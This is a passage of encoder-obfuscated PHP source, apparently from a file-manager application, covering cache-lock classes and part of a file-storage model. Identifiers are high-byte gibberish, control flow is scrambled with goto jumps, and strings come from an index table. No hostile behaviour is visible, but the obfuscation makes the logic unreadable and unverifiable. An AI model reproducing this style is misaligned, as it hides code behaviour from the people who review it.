self::set($fÁˆ¨îÔ»Á, $_SERVER[¬ı§†‰ú˜¼][33], 1, $C’«™é×èØ); } } goto aë¹ö›“‘; C¶õ¶Çø·: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto cŞª¼®ºÔ¡; cŞª¼®ºÔ¡: $Bµ œ’ğî =& $_SERVER[¬ı§†‰ú˜¼]; if (self::$handle) { return self::$handle; } $Aƒ·ùàğØÁ = $GLOBALS[$Bµ œ’ğî[6]][$Bµ œ’ğî[346]]; goto CîôÑ´ëÓ­; E¿İÒœÒ‘Å: if ($eçİ›º§ == $Bµ œ’ğî[17] && $c­ª½ëÄãÓ == $Bµ œ’ğî[9]) { $eçİ›º§ = $Bµ œ’ğî[192]; } switch ($eçİ›º§) { case $Bµ œ’ğî[803]: self::$handle = new CacheLockRedis(); break; case $Bµ œ’ğî[804]: self::$handle = new CacheLockMemcached(); break; case $Bµ œ’ğî[17]: self::$handle = new CacheLockDatabase(); break; case $Bµ œ’ğî[192]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto aõèÖõ²ö; CîôÑ´ëÓ­: self::$timeout = $Aƒ·ùàğØÁ[$Bµ œ’ğî[813]] ? $Aƒ·ùàğØÁ[$Bµ œ’ğî[813]] : 10; $c­ª½ëÄãÓ = _get($GLOBALS[$Bµ œ’ğî[6]], $Bµ œ’ğî[814]); $eçİ›º§ = $Aƒ·ùàğØÁ[$Bµ œ’ğî[800]] ? $Aƒ·ùàğØÁ[$Bµ œ’ğî[800]] : $Bµ œ’ğî[192]; goto E¿İÒœÒ‘Å; aõèÖõ²ö: } private static function key($DŠïêÆƒé) { return $_SERVER[¬ı§†‰ú˜¼][815] . Cache::key($DŠïêÆƒé); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($bÏƒˆíÄ‰ = '') { self::$errorMsg = $bÏƒˆíÄ‰; } public static function lockGlobal($CÎº¼ù“Êñ, $Ağ£­ŸÌîà) { return self::lock($CÎº¼ù“Êñ, $Ağ£­ŸÌîà, !0); } public static function lock($bÎ¸Èà·²§, $dóäñ°‡ = false, $eË¦£È¨„µ = false) { goto cÍÖ‘É£í…; a§øÙ’õ¶”: if (!$eË¦£È¨„µ) { self::$lockItem[$f¯„•Î§½‚] = !0; } return $eŒÂØØğÆŠ; goto A‡Šíê½ï„; cÍÖ‘É£í…: $B’’å†¬¢ =& $_SERVER[¬ı§†‰ú˜¼]; $Fõ«‰¾Ğ…ñ = self::init(); $f¯„•Î§½‚ = self::key($bÎ¸Èà·²§); goto eŞ¹Í‡ÒÈÏ; eŞ¹Í‡ÒÈÏ: $dóäñ°‡ = $dóäñ°‡ ? $dóäñ°‡ : self::$timeout; $eŒÂØØğÆŠ = $Fõ«‰¾Ğ…ñ->lock($f¯„•Î§½‚, $dóäñ°‡); if (!$eŒÂØØğÆŠ) { $E¡ŠàÛÛ¸Æ = "\154\157\143\x6b\40\145\x72\x72\x6f\162\x3b\x6b\145\171\x3d{$bÎ¸Èà·²§}\73\164\x69\x6d\x65\x3d{$dóäñ°‡}\x3b" . self::$errorMsg . $B’’å†¬¢[68] . get_caller_msg(); $bÀ¯×à±”Ç = LNG($B’’å†¬¢[816]) . "\x28{$dóäñ°‡}\x73\x29\56" . LNG($B’’å†¬¢[817]); $bÀ¯×à±”Ç .= $B’’å†¬¢[818]; if (is_string(self::$errorMsg) && self::$errorMsg) { $bÀ¯×à±”Ç = $bÀ¯×à±”Ç . $B’’å†¬¢[819] . self::$errorMsg; } write_log($E¡ŠàÛÛ¸Æ, $B’’å†¬¢[820]); show_json($bÀ¯×à±”Ç, !1); } goto a§øÙ’õ¶”; A‡Šíê½ï„: } public static function lockGet($EÓˆò¾»ë¬) { $a¨ëá¡‡éÂ = self::key($EÓˆò¾»ë¬); if (self::$lockItem[$a¨ëá¡‡éÂ]) { return self::$lockItem[$a¨ëá¡‡éÂ]; } return self::init()->lockGet($a¨ëá¡‡éÂ); } public static function unlock($b“Õ¥¨à÷à) { $DÌËŞåïË‡ = self::key($b“Õ¥¨à÷à); self::$lockItem[$DÌËŞåïË‡] = null; return self::init()->unlock($DÌËŞåïË‡); } public static function unlockRuntime() { $F‡Æ¼ÏÚâ =& $_SERVER[¬ı§†‰ú˜¼]; $fëÜóéœ‹ç = self::init(); $e‡õæß˜° = !1; foreach (self::$lockItem as $D›Ù£ ÅØ— => $F–Ê÷²ò¯”) { if (!$F–Ê÷²ò¯”) { continue; } $fëÜóéœ‹ç->unlock($D›Ù£ ÅØ—); if (!$e‡õæß˜°) { $e‡õæß˜° = !0; write_log($F‡Æ¼ÏÚâ[821] . $D›Ù£ ÅØ— . $F‡Æ¼ÏÚâ[68] . get_caller_msg(), $F‡Æ¼ÏÚâ[820]); continue; } write_log($F‡Æ¼ÏÚâ[821] . $D›Ù£ ÅØ—, $F‡Æ¼ÏÚâ[820]); } self::fileUnlockAll(); } public static function fileLock($C–÷›œ‹«) { goto Aª–ŸŠ‚í«; c‡Å”š…ŠÓ: if (flock($eÉ¢ñ“Ğ†, LOCK_EX)) { return !0; } self::unlock($C–÷›œ‹«); show_json($FœĞî½Œè[825], !1); goto cšÛ‘¡»¨ù; cšÛ‘¡»¨ù: return !1; goto b¢ÛâºÄÂÑ; c÷˜©ã‹òÏ: $eÉ¢ñ“Ğ† = fopen(DATA_PATH . $C–÷›œ‹« . $FœĞî½Œè[823], $FœĞî½Œè[824]); if (!$eÉ¢ñ“Ğ†) { return !1; } $GLOBALS[$FœĞî½Œè[822]][$C–÷›œ‹«] = $eÉ¢ñ“Ğ†; goto c‡Å”š…ŠÓ; Aª–ŸŠ‚í«: $FœĞî½Œè =& $_SERVER[¬ı§†‰ú˜¼]; if (!$GLOBALS[$FœĞî½Œè[822]]) { $GLOBALS[$FœĞî½Œè[822]] = array(); } $GLOBALS[$FœĞî½Œè[822]][$C–÷›œ‹«] = !1; goto c÷˜©ã‹òÏ; b¢ÛâºÄÂÑ: } public static function fileUnlock($Dà¯Û¹Û©¯) { $BÊ°‘¡ºŸÙ =& $_SERVER[¬ı§†‰ú˜¼]; $fßãÊ‹É—– = $GLOBALS[$BÊ°‘¡ºŸÙ[822]][$Dà¯Û¹Û©¯]; if (!$fßãÊ‹É—–) { return; } $GLOBALS[$BÊ°‘¡ºŸÙ[822]][$Dà¯Û¹Û©¯] = !1; flock($fßãÊ‹É—–, LOCK_UN); fclose($fßãÊ‹É—–); } public static function fileUnlockAll() { $fø¦“ÕÖ¢ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$GLOBALS[$fø¦“ÕÖ¢[822]]) { return; } foreach ($GLOBALS[$fø¦“ÕÖ¢[822]] as $D§ö­Çëª => $aó¨ŠÔÜÈ™) { if (!$aó¨ŠÔÜÈ™) { continue; } $GLOBALS[$fø¦“ÕÖ¢[822]][$D§ö­Çëª] = !1; flock($aó¨ŠÔÜÈ™, LOCK_UN); fclose($aó¨ŠÔÜÈ™); } $GLOBALS[$fø¦“ÕÖ¢[822]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $BŸìˆ¬ª¬Ò =& $_SERVER[¬ı§†‰ú˜¼]; $cô‘äá©·¹ = $GLOBALS[$BŸìˆ¬ª¬Ò[6]][$BŸìˆ¬ª¬Ò[346]]; self::$cachePath = $cô‘äá©·¹[$BŸìˆ¬ª¬Ò[192]][$BŸìˆ¬ª¬Ò[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($b±ŒÜÄŠËŞ, $BÀ²¨œïÜÑ = 0) { goto e„¢ÛÙ…; e„¢ÛÙ…: $cìÓôµ¢– =& $_SERVER[¬ı§†‰ú˜¼]; $Dœ…ô†á·¾ = microtime(!0); $C„Ïİ“µÓÉ = $Dœ…ô†á·¾ + $BÀ²¨œïÜÑ + 0.0001; goto cØ¡˜‹¬Í˜; dÁ‘Œ£Û´: $this->unlock($b±ŒÜÄŠËŞ); return !1; goto c›×ÜŒÂ®µ; cØ¡˜‹¬Í˜: $bËÔœ©‹Æ‚ = rtrim(self::$cachePath, $cìÓôµ¢–[8]) . $cìÓôµ¢–[826] . md5($b±ŒÜÄŠËŞ) . $cìÓôµ¢–[823]; if (file_exists($bËÔœ©‹Æ‚) && filemtime($bËÔœ©‹Æ‚) && filemtime($bËÔœ©‹Æ‚) < time() - 10) { @unlink($bËÔœ©‹Æ‚); } do { if (file_exists($bËÔœ©‹Æ‚)) { cacheLockWait(); continue; } $c¨ŒœŞ×ßñ = fopen($bËÔœ©‹Æ‚, $cìÓôµ¢–[827]); if (!$c¨ŒœŞ×ßñ) { return !1; } $Dç‘ØŸÈì¨ = flock($c¨ŒœŞ×ßñ, LOCK_EX | LOCK_NB); self::$caches[$b±ŒÜÄŠËŞ] = array($cìÓôµ¢–[828] => $c¨ŒœŞ×ßñ, $cìÓôµ¢–[192] => $bËÔœ©‹Æ‚); fwrite($c¨ŒœŞ×ßñ, $C„Ïİ“µÓÉ); clearstatcache(); if ($c¨ŒœŞ×ßñ && $Dç‘ØŸÈì¨) { return !0; } cacheLockWait(); } while (microtime(!0) < $C„Ïİ“µÓÉ); goto dÁ‘Œ£Û´; c›×ÜŒÂ®µ: } public function lockGet($b¾‘³¦à) { $bÕïâ¯Ó—Š =& $_SERVER[¬ı§†‰ú˜¼]; $bŸ«ãÕ›¶ = rtrim(self::$cachePath, $bÕïâ¯Ó—Š[8]) . $bÕïâ¯Ó—Š[826] . md5($b¾‘³¦à) . $bÕïâ¯Ó—Š[823]; return file_exists($bŸ«ãÕ›¶); } public function unlock($d¼ƒ¯ì“ëµ) { goto eòŠåíƒ†Ú; BÅÄŞ Šœô: unset(self::$caches[$d¼ƒ¯ì“ëµ]); goto e™µ‹×•ÈÀ; DĞÒĞÑ’ä¤: @flock($A´…Êº—Ù[$f„¯˜À…Éò[828]], LOCK_UN); @fclose($A´…Êº—Ù[$f„¯˜À…Éò[828]]); @unlink($A´…Êº—Ù[$f„¯˜À…Éò[192]]); goto BÅÄŞ Šœô; eòŠåíƒ†Ú: $f„¯˜À…Éò =& $_SERVER[¬ı§†‰ú˜¼]; $A´…Êº—Ù = self::$caches[$d¼ƒ¯ì“ëµ]; if (!$A´…Êº—Ù) { return; } goto DĞÒĞÑ’ä¤; e™µ‹×•ÈÀ: } } goto B Ğšù±Õ¼; A¬®‰´ì: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\145"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\145" => "\151\x6f\137\x66\151\154\x65\x5f\x6d\145\164\x61", "\x6d\x65\x74\x61\x46\151\x65\154\144" => "\x66\x69\154\x65\111\x44"); public function fileInfo($A÷…ÍöÁŸ) { $f¨Îå ÇåÏ =& $_SERVER[¬ı§†‰ú˜¼]; static $aºƒ‡¨¿Ì = array(); if (!isset($aºƒ‡¨¿Ì[$A÷…ÍöÁŸ])) { $A¶Ã»‹Ó½õ = $f¨Îå ÇåÏ[1734]; $fù ½‰Ş¹ = Model($f¨Îå ÇåÏ[448])->field($A¶Ã»‹Ó½õ)->where(array($f¨Îå ÇåÏ[446] => $A÷…ÍöÁŸ))->find(); $aºƒ‡¨¿Ì[$A÷…ÍöÁŸ] = $fù ½‰Ş¹; } return $aºƒ‡¨¿Ì[$A÷…ÍöÁŸ]; } public function addFileByContent($bÁ‚ÔÀÄÏ = '', $aŠ¥ª‹Š÷ = '') { goto d¡ïÑŒ—Ç; d¡ïÑŒ—Ç: $b›–­£Î³ç =& $_SERVER[¬ı§†‰ú˜¼]; $B¶Í³ïéÄ™ = TEMP_PATH . $b›–­£Î³ç[1735]; if (!is_dir($B¶Í³ïéÄ™)) { mk_dir($B¶Í³ïéÄ™); } goto a£†»²éòë; a£†»²éòë: $b¾í¹·¼¤ô = $B¶Í³ïéÄ™ . $b›–­£Î³ç[1736] . rand_string(16); file_put_contents($b¾í¹·¼¤ô, $bÁ‚ÔÀÄÏ); $f—º…ƒ¢¦¹ = $this->addFile($b¾í¹·¼¤ô, $aŠ¥ª‹Š÷, !0); goto bŸÀ³ïÎš„; bŸÀ³ïÎš„: if (file_exists($b¾í¹·¼¤ô)) { @unlink($b¾í¹·¼¤ô); } return $f—º…ƒ¢¦¹; goto EÄˆ¼ãËÁ¶; EÄˆ¼ãËÁ¶: } public function createFileName($B¹ìĞˆ¹°, $B¼·éÙæ¦ = false, $Bæëƒœ·§Â = false) { goto Dšç¿¢ÌÎİ; A½‘÷öİĞ¶: if (!$Dñ©¨çŒÀµ && !Cache::get($a•î…±İ”»)) { $Dñ©¨çŒÀµ = !0; $eÁË¯÷ = IO::mkdir($bâ¡¨Ÿã‹); if (!IO::exist($eÁË¯÷ . $d²«²ÏÕ½ó[762])) { IO::mkfile($eÁË¯÷ . $d²«²ÏÕ½ó[762]); } Cache::set($a•î…±İ”», 1, 3600 * 2); } return $fó†’½¹ÓÃ; goto bŸãæÎø²î; f°×‹‰´„: $bâ¡¨Ÿã‹ = $EçÓ´±Š©->pathFather($fó†’½¹ÓÃ); static $Dñ©¨çŒÀµ = false; $a•î…±İ”» = $d²«²ÏÕ½ó[1737] . md5($bâ¡¨Ÿã‹); goto A½‘÷öİĞ¶; Dšç¿¢ÌÎİ: $d²«²ÏÕ½ó =& $_SERVER[¬ı§†‰ú˜¼]; $EçÓ´±Š© = IO::init($d²«²ÏÕ½ó[8]); $fó†’½¹ÓÃ = $this->makeFilePath($B¹ìĞˆ¹°, $EçÓ´±Š©, $B¼·éÙæ¦, $Bæëƒœ·§Â); goto f°×‹‰´„; bŸãæÎø²î: } public function makeFilePath($b‹œƒªæ’, $aÛ‡ö‘ã“§, $aèø‚Üù‹İ = false, $Däçèã…˜İ = false) { goto BÜÆÊÍ¡¤Ô; dç¸Ø£°„: $D¾°ŠôìÖ® = $cŸ‰Ù²·ª . rand_string(5) . short_id(100); $b‹œƒªæ’ = str_replace($C‹´†¾¾¼[8], $C‹´†¾¾¼[71], KodIO::clear($b‹œƒªæ’)); $AÔîÇ‹©¸ = $aÛ‡ö‘ã“§->ext($b‹œƒªæ’); goto a¼¾Å°¸¶„; BÜÆÊÍ¡¤Ô: $C‹´†¾¾¼ =& $_SERVER[¬ı§†‰ú˜¼]; $c—äÒÈ‚ô› = Model($C‹´†¾¾¼[731])->get($C‹´†¾¾¼[1738]); $cŸ‰Ù²·ª = KodIO::defaultIO() . date($C‹´†¾¾¼[1739]); goto dç¸Ø£°„; a¼¾Å°¸¶„: if (!$b‹œƒªæ’) { $c—äÒÈ‚ô› = $C‹´†¾¾¼[1740]; } switch ($c—äÒÈ‚ô›) { case $C‹´†¾¾¼[1741]: $D¾°ŠôìÖ® = $D¾°ŠôìÖ® . $C‹´†¾¾¼[95] . $aÛ‡ö‘ã“§->ext($b‹œƒªæ’); if ($AÔîÇ‹©¸ == $C‹´†¾¾¼[1680]) { $D¾°ŠôìÖ® .= $C‹´†¾¾¼[1427]; } break; case $C‹´†¾¾¼[1742]: goto fĞ«É£‡‹; Dğ˜½…Ùêî: if (IO::isTypeObject($D¾°ŠôìÖ®) && !IO::isUploadServer($D¾°ŠôìÖ®)) { if (IO::exist($D¾°ŠôìÖ®)) { return $D¾°ŠôìÖ®; } $fô²“®­ì = IO::setContent($D¾°ŠôìÖ®, $C‹´†¾¾¼[33]); if (!$fô²“®­ì) { show_json($C‹´†¾¾¼[1745], !1); } } CacheLock::unlock($aîÛ‘°Ù·ª); break; goto f™¬ê¿òéÎ; FÅÆ©ì”µ: $cŸ‰Ù²·ª = $C‹´†¾¾¼[1122] . $EÙáä¤ó¦¾[$C‹´†¾¾¼[392]] . $C‹´†¾¾¼[400] . date($C‹´†¾¾¼[1743]) . $d–¤¾‚‹£ƒ . $C‹´†¾¾¼[8]; if ($AÔîÇ‹©¸ == $C‹´†¾¾¼[1680]) { $b‹œƒªæ’ .= $C‹´†¾¾¼[1427]; } $aîÛ‘°Ù·ª = $C‹´†¾¾¼[1744] . $cŸ‰Ù²·ª . $b‹œƒªæ’; goto Cäğ†ö¸é®; fĞ«É£‡‹: $DÛ‰Áæ = Model($C‹´†¾¾¼[731])->get($C‹´†¾¾¼[732]); $d–¤¾‚‹£ƒ = substr(md5($C‹´†¾¾¼[733] . $DÛ‰Áæ . date($C‹´†¾¾¼[712])), 0, 8); $EÙáä¤ó¦¾ = KodIO::defaultDriver(); goto FÅÆ©ì”µ; Cäğ†ö¸é®: CacheLock::lock($aîÛ‘°Ù·ª); $D¾°ŠôìÖ® = $cŸ‰Ù²·ª . $b‹œƒªæ’; if (IO::exist($cŸ‰Ù²·ª . $b‹œƒªæ’)) { $bÄ°Ø¡²ã = substr($b‹œƒªæ’, 0, strlen($b‹œƒªæ’) - strlen($AÔîÇ‹©¸)); $CÛá¸èç’‚ = $Däçèã…˜İ ? substr($Däçèã…˜İ, 0, 5) : ($aèø‚Üù‹İ ? substr($aèø‚Üù‹İ, 0, 5) : rand_string(5)); $D¾°ŠôìÖ® = $cŸ‰Ù²·ª . $bÄ°Ø¡²ã . $CÛá¸èç’‚ . $C‹´†¾¾¼[95] . $AÔîÇ‹©¸; } goto Dğ˜½…Ùêî; f™¬ê¿òéÎ: case $C‹´†¾¾¼[1740]: break; default: break; } return $D¾°ŠôìÖ®; goto BçŠ¿èÙ‘ó; BçŠ¿èÙ‘ó: } public function addFileByRemote($c¯–¹ˆËí™, $aæ²Û´«£™, $F‘µÉ¾ï = array()) { goto bœ¬õÚ«‚‚; bœ¬õÚ«‚‚: $aï¥‹†öÍÉ =& $_SERVER[¬ı§†‰ú˜¼]; if (!IO::exist($c¯–¹ˆËí™)) { return !1; } $aøÜöØÏ‚‰ = $F‘µÉ¾ï[$aï¥‹†öÍÉ[170]] ? $F‘µÉ¾ï[$aï¥‹†öÍÉ[170]] : $aï¥‹†öÍÉ[33]; goto E‘äøŠ¡ƒò; fÔÕ‹­Ùê­: if ($FÎ›åŒ¿ª = $this->addFileCheckExist($d»ÕãëŠ´[$aï¥‹†öÍÉ[171]], $d»ÕãëŠ´[$aï¥‹†öÍÉ[170]], $d»ÕãëŠ´[$aï¥‹†öÍÉ[78]])) { return $FÎ›åŒ¿ª; } return $this->addFileData($d»ÕãëŠ´); goto D©Åã®Äáˆ; E‘äøŠ¡ƒò: $d…÷æÏİ¬æ = IO::hashMd5($c¯–¹ˆËí™, $aøÜöØÏ‚‰); $a¾çÈ—ˆÛ¡ = KodIO::defaultDriver(); $d»ÕãëŠ´ = array($aï¥‹†öÍÉ[547] => IO::size($c¯–¹ˆËí™), $aï¥‹†öÍÉ[1746] => 1, $aï¥‹†öÍÉ[411] => $aæ²Û´«£™, $aï¥‹†öÍÉ[781] => $a¾çÈ—ˆÛ¡[$aï¥‹†öÍÉ[392]], $aï¥‹†öÍÉ[412] => $c¯–¹ˆËí™, $aï¥‹†öÍÉ[1747] => $F‘µÉ¾ï[$aï¥‹†öÍÉ[171]] ? $F‘µÉ¾ï[$aï¥‹†öÍÉ[171]] : IO::hashSimple($c¯–¹ˆËí™), $aï¥‹†öÍÉ[1748] => $d…÷æÏİ¬æ ? $d…÷æÏİ¬æ : $aøÜöØÏ‚‰); goto fÔÕ‹­Ùê­; D©Åã®Äáˆ: } private function addFileData($BÅ³™ë¬ïÇ) { $e”Âöœ¼–Ò =& $_SERVER[¬ı§†‰ú˜¼]; if (!$BÅ³™ë¬ïÇ) { return !1; } $BÅ³™ë¬ïÇ[$e”Âöœ¼–Ò[78]] = intval($BÅ³™ë¬ïÇ[$e”Âöœ¼–Ò[78]]); if (!$BÅ³™ë¬ïÇ[$e”Âöœ¼–Ò[78]] && strlen($BÅ³™ë¬ïÇ[$e”Âöœ¼–Ò[171]]) > 32) { $BÅ³™ë¬ïÇ[$e”Âöœ¼–Ò[78]] = intval(substr($BÅ³™ë¬ïÇ[$e”Âöœ¼–Ò[171]], 32)); } $cñæ¾ˆÏê = $this->add($BÅ³™ë¬ïÇ); return $this->find($cñæ¾ˆÏê); } public function addFile($DÓ®øÃ¥, $AƒÂÇêì·ô, $b¡Êˆ¯ÌÎè = false) { goto bõëğŒì; fÌÖ‹½÷ˆ©: $bö—õ¹Û­ê = $this->addFileMake($DÓ®øÃ¥, $f¸ÃáÀô°, $d‘åãÏß«¢, $C§¡È¶ˆŒ, $AƒÂÇêì·ô, $b¡Êˆ¯ÌÎè); $a®öîÔ·â = $this->addFileData($bö—õ¹Û­ê); CacheLock::unlock($AÄª¾¯ÔÔ); goto f¹‹¸ÚËÜ; cÒ×ÃºË´½: $AÄª¾¯ÔÔ = $_SERVER[¬ı§†‰ú˜¼][1749] . $C§¡È¶ˆŒ; CacheLock::lock($AÄª¾¯ÔÔ); if ($CŒ•¸Š›…ä = $this->addFileCheckExist($d‘åãÏß«¢, $C§¡È¶ˆŒ, $f¸ÃáÀô°)) { CacheLock::unlock($AÄª¾¯ÔÔ); return $CŒ•¸Š›…ä; } goto fÌÖ‹½÷ˆ©; f¹‹¸ÚËÜ: return $a®öîÔ·â; goto c‰‡Ñ³Ù°İ; bõëğŒì: $d‘åãÏß«¢ = IO::hashSimple($DÓ®øÃ¥); $C§¡È¶ˆŒ = IO::hashMd5($DÓ®øÃ¥); $f¸ÃáÀô° = IO::size($DÓ®øÃ¥); goto cÒ×ÃºË´½; c‰‡Ñ³Ù°İ: } public function addFileMake($E…³Û³Øù‹, $bœ¯—Î…, $EÊ…“îğµ×, $b×¶”ì‰°Ò, $e¤‰“áßä, $Bâ ¤†£Ì) { goto C†àŠ¥—©²; açÓ¯‘œÄ”: $AÉ‚å‚Å´• = KodIO::defaultDriver(); $BÒÒÀÅâƒ˜ = array($E¨«Š·©»[547] => $bœ¯—Î…, $E¨«Š·©»[1746] => 1, $E¨«Š·©»[411] => $e¤‰“áßä, $E¨«Š·©»[781] => $AÉ‚å‚Å´•[$E¨«Š·©»[392]], $E¨«Š·©»[412] => $c©ùÃ²Ğî÷, $E¨«Š·©»[1747] => $EÊ…“îğµ×, $E¨«Š·©»[1748] => $b×¶”ì‰°Ò); return $BÒÒÀÅâƒ˜; goto c…‘É¦Âì¼; b™Ë˜¾“·®: $EêÖÛñì†‡ = get_path_this($c©ùÃ²Ğî÷); if ($Bâ ¤†£Ì) { $e¼´äÅó¢¡ = IO::move($E…³Û³Øù‹, $cÙì„é©›, !1, $EêÖÛñì†‡); } else { $e¼´äÅó¢¡ = IO::copy($E…³Û³Øù‹, $cÙì„é©›, !1, $EêÖÛñì†‡); } if (!$e¼´äÅó¢¡) { return !1; } goto açÓ¯‘œÄ”; C†àŠ¥—©²: $E¨«Š·©» =& $_SERVER[¬ı§†‰ú˜¼]; $c©ùÃ²Ğî÷ = $this->createFileName($e¤‰“áßä, $EÊ…“îğµ×, $b×¶”ì‰°Ò); $cÙì„é©› = get_path_father($c©ùÃ²Ğî÷); goto b™Ë˜¾“·®; c…‘É¦Âì¼: } public function addFileCheckExist($E„›§´ÇÙ, $DŞ¡Ñƒ¤´é, $B“âÄïŸË’) { $cÄ·‰Ë¡ËÁ =& $_SERVER[¬ı§†‰ú˜¼]; $E÷‘»ÄÏŸ = $this->findByHash($E„›§´ÇÙ, $DŞ¡Ñƒ¤´é); if (!$E÷‘»ÄÏŸ) { return !1; } $c®ÎŠ¶Æğ¶ = array($cÄ·‰Ë¡ËÁ[1746] => intval($E÷‘»ÄÏŸ[$cÄ·‰Ë¡ËÁ[1750]]) + 1, $cÄ·‰Ë¡ËÁ[547] => $B“âÄïŸË’); $this->where(array($cÄ·‰Ë¡ËÁ[446] => $E÷‘»ÄÏŸ[$cÄ·‰Ë¡ËÁ[445]]))->save($c®ÎŠ¶Æğ¶); return $E÷‘»ÄÏŸ; } public function remove($b‰…°ÒËÌ) { $this->linkCountChange($b‰…°ÒËÌ, !1); $this->clearEmpty(); return !0; } public function linkAdd($fä¥Çø’) { $this->linkCountChange($fä¥Çø’, !0); } public function linkCountChange($bŸ ¹ãï·¼, $cµŞ²Ñ×) { goto D Ê¸„‘¥ö; D Ê¸„‘¥ö: $d¨ŸÒ±¿Ü =& $_SERVER[¬ı§†‰ú˜¼]; if (!$bŸ ¹ãï·¼) { return; } if (!is_array($bŸ ¹ãï·¼)) { $bŸ ¹ãï·¼ = array($bŸ ¹ãï·¼); } goto e²ºñ¾½×; e²ºñ¾½×: $FëÙ´—Úğ = array(); foreach ($bŸ ¹ãï·¼ as $DÁˆš ›Àà) { $d„ˆÂ°ö = $DÁˆš ›Àà . $d¨ŸÒ±¿Ü[33]; if (!$FëÙ´—Úğ[$d„ˆÂ°ö]) { $FëÙ´—Úğ[$d„ˆÂ°ö] = 0; } $FëÙ´—Úğ[$d„ˆÂ°ö]++; } $D¯‘è˜ãï = array(); goto FÑóé‰¶ô; FÑóé‰¶ô: foreach ($FëÙ´—Úğ as $DÁˆš ›Àà => $dš æ•†‹•) { $d„ˆÂ°ö = $dš æ•†‹• . $d¨ŸÒ±¿Ü[33]; if (!$D¯‘è˜ãï[$d„ˆÂ°ö]) { $D¯‘è˜ãï[$d„ˆÂ°ö] = array(); } $D¯‘è˜ãï[$d„ˆÂ°ö][] = $DÁˆš ›Àà; } foreach ($D¯‘è˜ãï as $dš æ•†‹• => $eÏïÃÉªº) { if (!$eÏïÃÉªº) { continue; } $dš æ•†‹• = $cµŞ²Ñ× ? $dš æ•†‹• : -intval($dš æ•†‹•); $bµß”ÏÒã = array($d¨ŸÒ±¿Ü[445] => array($d¨ŸÒ±¿Ü[7], $eÏïÃÉªº)); if ($dš æ•†‹• < 0) { $bµß”ÏÒã[$d¨ŸÒ±¿Ü[1750]] = array($d¨ŸÒ±¿Ü[971], abs($dš æ•†‹•)); } $this->where($bµß”ÏÒã)->setAdd($d¨ŸÒ±¿Ü[1750], $dš æ•†‹•); } goto fñ­Ñ•Ô; fñ­Ñ•Ô: } public function findByHash($aÕˆ‘Á ›, $F¯Ç¶”á´É = false) { $f„¡¡Ù”§× =& $_SERVER[¬ı§†‰ú˜¼]; if (!$aÕˆ‘Á › && !$F¯Ç¶”á´É) { return !1; } $BˆÉä‰ìÜÃ = array($f„¡¡Ù”§×[1747] => $aÕˆ‘Á ›); if ($F¯Ç¶”á´É) { $BˆÉä‰ìÜÃ = array($f„¡¡Ù”§×[1748] => $F¯Ç¶”á´É); } return $this->order($f„¡¡Ù”§×[1751])->where($BˆÉä‰ìÜÃ)->find(); } public function clearEmpty($Câ¿òš”Œä = 0) { goto eŞÀÉŒÛĞ; eŞÀÉŒÛĞ: $d”âÉèÉÍ‡ =& $_SERVER[¬ı§†‰ú˜¼]; $b›áå¤Ëê± = time() - 3600 * 24 * $Câ¿òš”Œä; $FÑ‚Åª‰â» = $d”âÉèÉÍ‡[1752] . $b›áå¤Ëê±; goto b‹ë¿­œˆÎ; b‹ë¿­œˆÎ: $aåöäŠÆôó = $this->where($FÑ‚Åª‰â»)->select(); if (!$aåöäŠÆôó) { return; } $B§èŒ£ØËğ = new Task($d”âÉèÉÍ‡[1753], $d”âÉèÉÍ‡[33], count($aåöäŠÆôó)); goto EÙêÄøË¥‚; EÙêÄøË¥‚: foreach ($aåöäŠÆôó as $a×‘ê÷¢¤÷) { $B§èŒ£ØËğ->update(1); $this->resetFile($a×‘ê÷¢¤÷); } $B§èŒ£ØËğ->end(); goto f©ËïÏ»Æ; f©ËïÏ»Æ: } public function resetFile($a‘Äì·¶øÉ) { goto F‚ŸÄí‰Ğ¯; eà–ŞÁùµ: $cç÷¦µ¢›… = Model($A³“‘Ñ§Ò[1754])->where($fñ×â¯å‡ä)->count(); $a‘·É˜³ÕÛ = intval($F‘ƒøÍ—Ñ¢) + intval($cç÷¦µ¢›…); if ($a‘·É˜³ÕÛ == 0) { IO::remove($a‘Äì·¶øÉ[$A³“‘Ñ§Ò[76]]); Model($A³“‘Ñ§Ò[1755])->delete($a‘Äì·¶øÉ[$A³“‘Ñ§Ò[445]]); $this->where($fñ×â¯å‡ä)->delete(); $this->metaSet($a‘Äì·¶øÉ[$A³“‘Ñ§Ò[445]], null, null); return; } goto Bœ‚¢ÉêÉ ; F‚ŸÄí‰Ğ¯: $A³“‘Ñ§Ò =& $_SERVER[¬ı§†‰ú˜¼]; $fñ×â¯å‡ä = array($A³“‘Ñ§Ò[446] => $a‘Äì·¶øÉ[$A³“‘Ñ§Ò[445]]); $F‘ƒøÍ—Ñ¢ = Model($A³“‘Ñ§Ò[1204])->where($fñ×â¯å‡ä)->count(); goto eà–ŞÁùµ; Bœ‚¢ÉêÉ : if ($a‘Äì·¶øÉ[$A³“‘Ñ§Ò[1750]] != $a‘·É˜³ÕÛ) { $this->where($fñ×â¯å‡ä)->save(array($A³“‘Ñ§Ò[1746] => $a‘·É˜³ÕÛ)); } goto EæÜğ­÷ƒ¬; EæÜğ­÷ƒ¬: } public function storageInfo($f“íÁ„ß‡î = false) { goto aäÔñÖâš£; f—„¨Ç¿’ó: $cåÊÊ©Íèš = 1; $cÜéâ„ÙˆÑ = 0; $dØãŒ¯áÂÁ = 5000; goto B‘œ¥ùêÇÇ; aäÔñÖâš£: $BæĞ²ñ‰ˆ‘ =& $_SERVER[¬ı§†‰ú˜¼]; $C‡ŒÉ·Â—Æ = $this->count() + 0.0; $D½Ã®”™¾÷ = 0; goto f—„¨Ç¿’ó; B‘œ¥ùêÇÇ: for ($D´ ±ò¢ª  = 0; $D´ ±ò¢ª  < $C‡ŒÉ·Â—Æ; $D´ ±ò¢ª  = $D´ ±ò¢ª  + $dØãŒ¯áÂÁ) { $aƒîƒÆª¬Š = $this->limit($D´ ±ò¢ª , $D´ ±ò¢ª  + $dØãŒ¯áÂÁ)->select(); foreach ($aƒîƒÆª¬Š as $D‘”˜—·Òã) { 